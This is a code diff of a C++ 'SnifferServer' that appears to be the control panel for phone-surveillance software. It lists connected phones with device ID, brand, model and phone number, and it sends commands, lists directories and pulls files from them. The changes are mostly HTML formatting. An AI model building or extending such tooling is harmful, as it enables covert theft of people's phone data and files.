@@ -1036,10 +1036,11 @@ int SnifferServer::GetClientList(
 		char count[16];
 		sprintf(count, "%d", mClientMap.Size());
 
-		result = "<html>\n<head>\n<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />\n</head>\n<body>\n";
-		result += "<b>在线客户端列表&nbsp;:&nbsp";
+		result = "<html><head><meta http-equiv='Content-Type' content='text/html; charset=utf-8' /></head><body>";
+		result += "<pre>";
+		result += "<b>在线客户端列表 : ";
 		result += count;
-		result += "</b></br>\n";
+		result += " 个</b>\n";
 
 		for( ClientMap::iterator itr = mClientMap.Begin(); itr != mClientMap.End(); itr++ ) {
 			client = (Client*)itr->second;
@@ -1054,22 +1055,24 @@ int SnifferServer::GetClientList(
 			result += clientId;
 			result += "\">";
 
-			result += "[&nbsp;";
+			result += "[ ";
 			result += CLIENT_ID;
-			result += "&nbsp;:&nbsp;";
+			result += " : ";
 			result += clientId;
-			result += "&nbsp;]";
+			result += " ]";
 
-			result += "&nbsp;&nbsp;";
+			result += "   ";
 
-			result += "[&nbsp;";
+			result += "[ ";
 			result += DEVICE_ID;
-			result += "&nbsp;:&nbsp;";
+			result += " : ";
 			result += client->deviceId;
-			result += "&nbsp;]";
-			result += "</a></br>\n";
-		}
+			result += " ]";
+			result += "</a>\n";
 
+		}
+		result += "</pre>";
+		result += "</body></html>";
 	}break;
 	case JSON:{
 		Json::FastWriter writer;
@@ -1121,8 +1124,14 @@ int SnifferServer::GetClientInfo(
 			ptType
 			);
 
-	Client *client = NULL;
 
+	result = "<html><head><meta http-equiv='Content-Type' content='text/html; charset=utf-8' /></head><body>";
+	result += "<pre>";
+	result += "<b>没有客户端详细信息</b>\n";
+	result += "</pre>";
+	result += "</body></html>";
+
+	Client *client = NULL;
 	mClientMap.Lock();
 	ClientMap::iterator itr = mClientMap.Find(atoi(clientId));
 	if( itr != mClientMap.End() ) {
@@ -1131,8 +1140,9 @@ int SnifferServer::GetClientInfo(
 
 		switch( ptType ) {
 		case HTML:{
-			result = "<html>\n<head>\n<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />\n</head>\n<body>\n";
-			result += "<b>客户端详细信息</b></br>\n";
+			result = "<html><head><meta http-equiv='Content-Type' content='text/html; charset=utf-8' /></head><body>";
+			result += "<pre>";
+			result += "<b>客户端详细信息</b>\n";
 
 			char clientId[16];
 			sprintf(clientId, "%d", client->fd);
@@ -1140,27 +1150,27 @@ int SnifferServer::GetClientInfo(
 			result += CLIENT_ID;
 			result += " : ";
 			result += clientId;
-			result += "</br>";
+			result += "\n";
 
 			result += DEVICE_ID;
 			result += " : ";
 			result += client->deviceId;
-			result += "</br>";
+			result += "\n";
 
 			result += PHONE_INFO_BRAND;
 			result += " : ";
 			result += client->brand;
-			result += "</br>";
+			result += "\n";
 
 			result += PHONE_INFO_MODEL;
 			result += " : ";
 			result += client->model;
-			result += "</br>";
+			result += "\n";
 
 			result += PHONE_INFO_NUMBER;
 			result += " : ";
 			result += client->phoneNumber;
-			result += "</br></br>";
+			result += "\n\n";
 
 			result += "<a href=\"";
 			result += GET_CLIENT_DIR;
@@ -1170,8 +1180,10 @@ int SnifferServer::GetClientInfo(
 			result += clientId;
 			result += "\">";
 			result += "列目录";
-			result += "</a></br>\n";
+			result += "</a>\n";
 
+			result += "</pre>";
+			result += "</body></html>";
 		}break;
 		case JSON:{
 			Json::FastWriter writer;
@@ -1191,7 +1203,6 @@ int SnifferServer::GetClientInfo(
 
 		}break;
 		}
-
 
 	}
 	mClientMap.Unlock();
@@ -1234,6 +1245,7 @@ int SnifferServer::SetClientCmd(
 		if( client != NULL ) {
 			// 创建命令
 			SetClientCmdTask* task = new SetClientCmdTask();
+			task->SetPtType(ptType);
 			task->SetCommand(command);
 
 			// 发送命令
@@ -1286,6 +1298,7 @@ int SnifferServer::GetClientDir(
 
 		// 创建命令
 		GetClientDirTask* task = new GetClientDirTask();
+		task->SetPtType(ptType);
 		task->SetClientId(iClientId);
 		task->SetDir(directory);
 
@@ -1342,6 +1355,7 @@ int SnifferServer::UploadClientFile(
 
 		// 创建命令
 		UploadClientFileTask* task = new UploadClientFileTask();
+		task->SetPtType(ptType);
 		task->SetClientId(iClientId);
 		task->SetFilePath(filePath);
 
